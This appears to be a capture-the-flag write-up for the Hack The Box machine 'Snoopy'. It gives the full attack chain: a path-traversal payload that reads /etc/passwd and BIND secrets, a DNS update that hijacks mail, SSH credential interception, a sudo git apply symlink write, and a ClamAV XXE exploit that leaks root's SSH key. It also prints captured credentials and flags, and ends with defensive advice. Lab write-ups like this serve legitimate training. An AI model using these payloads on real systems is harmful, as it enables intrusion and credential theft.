---
title: "HTB - Snoopy"
author: "M0k4"
date: "2026-10-06"
tags: ["htb", "writeup", "linux", "hard", "nginx", "bind", "lfi", "dns", "nsupdate", "mattermost", "ssh-mitm", "git", "clamav", "xxe"]
---

# HTB - Snoopy

**IP Address:** `10.129.229.5`  
**OS:** `Linux (Ubuntu 22.04.2 LTS)`  
**Difficulty:** `Hard`  
**Tags:** #Nginx #BIND #PathTraversal #DNS #nsupdate #Mattermost #SSH-MITM #GitApply #ClamAV #XXE

---
## Synopsis

Snoopy is a hard Linux machine hosting an nginx marketing site, BIND DNS, and a Mattermost instance. A path-traversal bypass on `/download?file=` leaks BIND configuration and the `rndc-key`, which enables dynamic DNS updates. Pointing `mail.snoopy.htb` at the attacker intercepts Mattermost password-reset mail for `cschultz`, granting chat access. A `/server_provision` slash command triggers an outbound Paramiko SSH connection that is captured with `ssh-mitm`, yielding `cbrown` credentials. Lateral movement to `sbrown` abuses a restricted `sudo git apply` that writes into `~/.ssh` via a symlink rename. Root comes from running a crafted DMG through `sudo clamscan --debug` (CVE-2023-20052), leaking `/root/.ssh/id_rsa`.

---
## Skills Required

- Web and DNS enumeration (`nmap`, `whatweb`, `dig`, Burp)
- Understanding path filters and filter-bypass patterns
- Capturing SMTP traffic and decoding Quoted-Printable tokens
- Linux privilege escalation (`sudo -l`, restricted commands)

## Skills Learned

- BIND dynamic updates with `nsupdate` and an `rndc` key
- Capturing automated SSH client credentials with `ssh-mitm`
- Arbitrary file write via `git apply` + symlink rename
- ClamAV DMG XXE information disclosure (CVE-2023-20052)

---
## 1. Initial Enumeration

### 1.1 Connectivity Test

Check if the host is alive using ICMP:

```bash
ping -c 1 10.129.229.5
```

![ping](screenshots/snoopy_01_ping.png)

TTL `63` is consistent with a Linux host one hop away.

---
### 1.2 Port Scanning

Scan all TCP ports to identify open services:

```bash
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.129.229.5 -oG allPorts
```

- `-p-` : Scan all 65,535 ports  
- `--open` : Show only open ports  
- `-sS` : SYN scan (stealthy and fast)  
- `--min-rate 5000` : Increase scan speed  
- `-Pn` : Skip host discovery  
- `-oG` : Output in grepable format  

![allports](screenshots/snoopy_02_nmap_allports.png)

Extract the open ports:

```bash
extractPorts allPorts
```

![extractports](screenshots/snoopy_03_extractports.png)

Open ports: `22`, `53`, `80`.

---
### 1.3 Targeted Scan

Run a deeper scan on the identified ports with version detection and default scripts:

```bash
nmap -sCV -p22,53,80 10.129.229.5 -oN targeted
cat targeted
```

- `-sC` : Run default NSE scripts  
- `-sV` : Detect service versions  
- `-oN` : Output in human-readable format  

![targeted](screenshots/snoopy_04_nmap_targeted.png)

**Findings:**

| Port(s) | Service | Notes |
|---|---|---|
| 22/tcp | OpenSSH 8.9p1 | Ubuntu |
| 53/tcp | ISC BIND 9.18.12 | Zone transfers later matter |
| 80/tcp | nginx 1.18.0 | Title: *SnoopySec Bootstrap Template* |

Map the domain into `/etc/hosts` once it appears in content:

```bash
echo "10.129.229.5 snoopy.htb mail.snoopy.htb mm.snoopy.htb www.snoopy.htb" | sudo tee -a /etc/hosts
```

---
## 2. Service Enumeration

### 2.1 Web Application Enumeration

Fingerprint the HTTP service and browse the marketing site for emails, downloads, and hostnames:

```bash
whatweb http://10.129.229.5
```

![whatweb](screenshots/snoopy_05_whatweb.png)

![website home](screenshots/snoopy_06_website_home.png)

The homepage offers two download links (“press release package” / “recent announcement”). The announcement PDF names CEO **Charles Schultz**, PR contact **Sally Brown** (`pr@snoopy.htb`), and domain `www.snoopy.htb`.

![announcement p1](screenshots/snoopy_07_announcement_pdf_p1.png)

![announcement p2](screenshots/snoopy_08_announcement_pdf_p2.png)

The Team page lists usable emails:

| Name | Email |
|---|---|
| Charles Schultz | `cschultz@snoopy.htb` |
| Sally Brown | `sbrown@snoopy.htb` |
| Harold Angel | `hangel@snoopy.htb` |
| Lucy Van Pelt | `lpelt@snoopy.htb` |

![team](screenshots/snoopy_09_team_page.png)

Contact shows a PHP mail-form error and a banner stating DNS is migrating and that `mail.snoopy.htb` is offline — a strong hint that mail routing will matter later.

![contact](screenshots/snoopy_10_contact_mail_banner.png)

`mail.snoopy.htb` currently serves the same site as the main host.

![mail vhost](screenshots/snoopy_11_mail_vhost.png)

---
### 2.2 DNS Zone Transfer

BIND is exposed, so attempt a zone transfer for `snoopy.htb`:

```bash
dig axfr @10.129.229.5 snoopy.htb
```

![dig axfr](screenshots/snoopy_12_dig_axfr.png)

AXFR succeeds and reveals Docker-oriented hosts among others:

| Hostname | A record |
|---|---|
| `mattermost.snoopy.htb` | `172.18.0.3` |
| `mm.snoopy.htb` | `127.0.0.1` |
| `postgres.snoopy.htb` | `172.18.0.2` |
| `provisions.snoopy.htb` | `172.18.0.4` |
| `www.snoopy.htb` | `127.0.0.1` |

Add the interesting names to `/etc/hosts` and confirm:

```bash
cat /etc/hosts | grep snoopy
```

![hosts](screenshots/snoopy_13_hosts_file.png)

Most vhosts redirect to the main site. `mm.snoopy.htb` is different: it hosts Mattermost.

![mm landing](screenshots/snoopy_14_mm_landing.png)

![mm login](screenshots/snoopy_15_mm_login.png)

Self-registration is blocked. Password reset for `cschultz@snoopy.htb` fails while mail is offline.

![access problem](screenshots/snoopy_16_mm_access_problem.png)

![reset password](screenshots/snoopy_17_mm_reset_password.png)

![reset failed](screenshots/snoopy_18_mm_reset_failed.png)

---
### 2.3 Path Traversal on `/download`

Inspect the announcement download in Burp. The endpoint is `/download?file=…` and returns a ZIP (`press_release.zip`) wrapping files under `press_package/`.

![burp download](screenshots/snoopy_19_burp_download.png)

Baseline Burp probes against the same host (index HTML and missing paths) confirm nginx behavior before focusing on the `file` parameter:

![burp index](screenshots/snoopy_20_burp_index.png)

![burp test 404](screenshots/snoopy_21_burp_test_404.png)

![burp test php](screenshots/snoopy_22_burp_test_php.png)

Naive absolute and `../` payloads return empty ZIPs. A non-recursive filter bypass works: `....//` (after one `../` strip, a traversal remains).

```http
GET /download?file=....//....//....//....//....//etc/passwd HTTP/1.1
Host: snoopy.htb
```

![lfi abs fail](screenshots/snoopy_23_lfi_abs_fail.png)

![lfi dotdot fail](screenshots/snoopy_24_lfi_dotdot_fail.png)

![lfi bypass](screenshots/snoopy_25_lfi_bypass_passwd.png)

Unzip and list shell users:

```bash
unzip passwd.zip
cat press_package/etc/passwd | grep bash
```

![passwd users](screenshots/snoopy_26_passwd_users.png)

Recovered local users include `cbrown`, `sbrown`, `lpelt`, `cschultz`, and `vgray`.

---
### 2.4 BIND Config and `rndc-key`

Reuse the same traversal to read BIND configuration referenced by the open DNS service:

```http
GET /download?file=....//....//....//....//....//etc/bind/named.conf.local HTTP/1.1
Host: snoopy.htb
```

![lfi named.conf.local](screenshots/snoopy_27_lfi_named_conf_local.png)

```bash
unzip bind9.zip
cat press_package/etc/bind/named.conf.local
```

![named.conf.local](screenshots/snoopy_28_named_conf_local.png)

The zone allows updates authenticated with key `"rndc-key"`. Fetch `named.conf` for the secret:

```http
GET /download?file=....//....//....//....//....//etc/bind/named.conf HTTP/1.1
Host: snoopy.htb
```

![lfi named.conf](screenshots/snoopy_29_lfi_named_conf.png)

```bash
unzip key.zip
cat press_package/etc/bind/named.conf
```

![rndc key](screenshots/snoopy_30_rndc_key.png)

Recovered key material:

```text
key "rndc-key" {
    algorithm hmac-sha256;
    secret "BEqUtce8Ouhu3TOEGJJaMlSx9WT2pkdeCtzBeDykQQA=";
};
```

---
## 3. Foothold

### 3.1 Dynamic DNS Update to Steal Mail

With the `rndc` key, add an A record so `mail.snoopy.htb` points at the attacker (here `10.10.15.14`), then verify with AXFR:

```bash
cat > rndc.key <<'EOF'
key "rndc-key" {
    algorithm hmac-sha256;
    secret "BEqUtce8Ouhu3TOEGJJaMlSx9WT2pkdeCtzBeDykQQA=";
};
EOF

nsupdate -k rndc.key
```

```text
server 10.129.229.5
zone snoopy.htb
update add mail.snoopy.htb. 60 A 10.10.15.14
send
quit
```

```bash
dig axfr @10.129.229.5 snoopy.htb
```

![nsupdate](screenshots/snoopy_31_nsupdate_mail.png)

Start a local SMTP listener and trigger Mattermost password reset for `cschultz@snoopy.htb`:

```bash
sudo python3 -m aiosmtpd -n -l 0.0.0.0:25
```

![smtp intercept](screenshots/snoopy_32_smtp_intercept.png)

The reset link uses Quoted-Printable encoding. Strip the soft line breaks and the `=3D` artifact so the token starts without a leading `3D`:

```text
http://mm.snoopy.htb/reset_password_complete?token=<token_without_3D>
```

Using the raw `3D…` token fails; the cleaned token works and the password can be changed.

![reset token page](screenshots/snoopy_33_reset_token_page.png)

![invalid token](screenshots/snoopy_34_invalid_token.png)

![password updated](screenshots/snoopy_35_password_updated.png)

---
### 3.2 Mattermost — Server Provisioning Callback

Log in as `cschultz`. Town Square mentions ClamAV and FreeIPA-style host provisioning. Join the hidden **Server Provisioning** channel (`~it-support`) and use `/server_provision`.

![town square](screenshots/snoopy_36_mattermost_town_square.png)

![about](screenshots/snoopy_37_mattermost_about.png)

Mattermost Team Edition `7.9.0` (Postgres).

![find channels](screenshots/snoopy_38_find_channels.png)

![server provisioning](screenshots/snoopy_39_server_provisioning.png)

![provision form](screenshots/snoopy_40_provision_form.png)

Submit a provision request with the attacker IP. A netcat listener on TCP/2222 receives an outbound SSH client banner:

```bash
nc -lvnp 2222
```

![paramiko callback](screenshots/snoopy_41_nc_paramiko_callback.png)

Banner: `SSH-2.0-paramiko_3.1.0`. `cbrown` also DMs that they will handle the request after lunch — consistent with an automated/operator follow-up SSH.

![cbrown dm](screenshots/snoopy_42_cbrown_dm.png)

---
### 3.3 Credential Capture with `ssh-mitm`

Replace the dumb listener with `ssh-mitm` so the Paramiko client authenticates through to the real host while credentials are logged:

```bash
ssh-mitm server --listen-port 2222 --remote-host 10.129.229.5 --remote-port 22
```

Resubmit the provision request. Captured credentials:

```text
cbrown : sn00pedcr3dential!!!
```

![ssh-mitm](screenshots/snoopy_43_ssh_mitm_creds.png)

SSH in as `cbrown`:

```bash
ssh cbrown@10.129.229.5
```

![ssh cbrown](screenshots/snoopy_44_ssh_cbrown.png)

---
## 4. Privilege Escalation

### 4.1 Lateral Movement — `cbrown` → `sbrown` via `git apply`

Enumerate groups and sudo rules:

```bash
id
sudo -l
```

![cbrown enum](screenshots/snoopy_45_cbrown_enum.png)

![sudo git](screenshots/snoopy_46_sudo_git_apply.png)

`cbrown` may run as `sbrown`:

```text
(sbrown) PASSWD: /usr/bin/git ^apply -v [a-zA-Z0-9.]+$
```

Generate an SSH key, then build a repo whose symlink points at `/home/sbrown/.ssh`. A patch renames that symlink and creates `authorized_keys` through it:

```bash
ssh-keygen -f sbrown_key -N ""
# on target:
cd /dev/shm
mkdir lat-mov && chmod 777 lat-mov && cd lat-mov
git init .
ln -s /home/sbrown/.ssh symlink
git add symlink
git commit -m "vuln"
```

![ssh-keygen](screenshots/snoopy_47_ssh_keygen_sbrown.png)

![git symlink](screenshots/snoopy_48_git_symlink_repo.png)

```bash
cat > patch <<'EOF'
diff --git a/symlink b/renamed
similarity index 100%
rename from symlink
rename to renamed
diff --git a/renamed/authorized_keys b/renamed/authorized_keys
new file mode 100644
index 0000000..1111111
--- /dev/null
+++ b/renamed/authorized_keys
@@ -0,0 +1 @@
+ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIG02dnbN6xyXS6CdFHIUFJGJRnGtTY4Bkd1Kl6wIWRft kali@kali
EOF
```

![git patch](screenshots/snoopy_49_git_patch.png)

```bash
sudo -u sbrown /usr/bin/git apply -v patch
```

![git apply](screenshots/snoopy_50_git_apply_success.png)

SSH as `sbrown` and grab the user flag:

```bash
chmod 600 sbrown_key
ssh -i sbrown_key sbrown@10.129.229.5
cat user.txt
```

![user flag](screenshots/snoopy_51_user_flag.png)

🏁 **User flag obtained** — `15b363524d8fc2d23fb5d53a5a338a84`

---
### 4.2 Root — ClamAV DMG XXE (CVE-2023-20052)

`sbrown` can run ClamAV as root against files under `~/scanfiles`:

```bash
sudo -l
/usr/local/bin/clamscan --version
```

![sudo clamscan](screenshots/snoopy_52_sudo_clamscan.png)

![clamscan version](screenshots/snoopy_53_clamscan_version.png)

```text
(root) NOPASSWD: /usr/local/bin/clamscan ^--debug /home/sbrown/scanfiles/[a-zA-Z0-9.]+$
ClamAV 1.0.0
```

Build a malicious DMG that XXE-reads `/root/.ssh/id_rsa` (CVE-2023-20052 helper), upload it, and scan with `--debug`:

```bash
git clone https://github.com/tralsesec/CVE-2023-20052.git
cd CVE-2023-20052
chmod +x exploit.sh
./exploit.sh
# File to read: /root/.ssh/id_rsa

scp -i sbrown_key exploit.dmg sbrown@10.129.229.5:/home/sbrown/scanfiles/exploit.dmg
```

![cve build](screenshots/snoopy_54_cve_2023_20052_build.png)

![scp](screenshots/snoopy_55_scp_exploit_dmg.png)

```bash
sudo /usr/local/bin/clamscan --debug /home/sbrown/scanfiles/exploit.dmg
```

![clamscan debug](screenshots/snoopy_56_clamscan_debug.png)

![root key leak](screenshots/snoopy_57_root_key_leak.png)

Debug output leaks the OpenSSH private key. Save it and SSH to localhost as root:

```bash
chmod 600 /tmp/root_id_rsa
ssh -i /tmp/root_id_rsa root@127.0.0.1
whoami
cat root.txt
```

![root flag](screenshots/snoopy_58_root_flag.png)

🏁 **Root flag obtained** — `fa164ff1acb85001a648a3fbcd48e24d`

---
# ✅ MACHINE COMPLETE

---
## Summary of Exploitation Path

1. Enumerate nginx + BIND; AXFR reveals Mattermost and related hosts.
2. Bypass `/download` path filter with `....//` to steal BIND config and `rndc-key`.
3. `nsupdate` points `mail.snoopy.htb` at the attacker; intercept Mattermost reset for `cschultz`.
4. Abuse `/server_provision` + `ssh-mitm` to capture `cbrown:sn00pedcr3dential!!!`.
5. Abuse `sudo git apply` (symlink rename) to plant `sbrown` `authorized_keys` → user flag.
6. Abuse `sudo clamscan --debug` on a CVE-2023-20052 DMG to leak root’s SSH key → root flag.

---
## Defensive Recommendations

- Sanitize download paths with realpath/allowlists; reject traversal after normalization, not a single `../` strip.
- Do not expose BIND recursion/transfers/update keys on the attack surface; restrict `allow-update` / `allow-transfer` and protect `rndc` secrets.
- Ensure password-reset mail cannot be redirected via attacker-controlled MX/A records for the mail hostname.
- Treat automation that SSHs to requester-supplied IPs as high risk; pin hosts, use keys only, and never reuse interactive passwords.
- Avoid granting `git apply` (or other VCS write tools) as another user; symlink-aware patch application enables arbitrary writes.
- Do not allow unprivileged users to run `clamscan --debug` as root on attacker-controlled archives; keep ClamAV patched past CVE-2023-20052.
